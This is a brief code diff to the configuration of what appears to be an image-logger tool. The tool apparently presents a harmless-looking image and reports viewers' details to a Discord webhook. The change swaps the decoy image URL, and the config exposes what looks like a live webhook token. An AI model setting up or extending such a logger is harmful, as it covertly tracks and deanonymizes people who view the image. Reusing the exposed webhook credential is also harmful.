@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1339383522061844531/HoLoAtXdWh8_ReqTUjeF5oMYYssTUgAQxxmdzP-gFJt7LkobogOC1r5maK1h4gSNdu2l",
-    "image": "https://coinremitter.com/assets/img/supported_currency/currency_usdttrc20.png", # You can also have a custom image by using a URL argument
+    "image": "https://scx2.b-cdn.net/gfx/news/hires/2012/howcanyousee.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
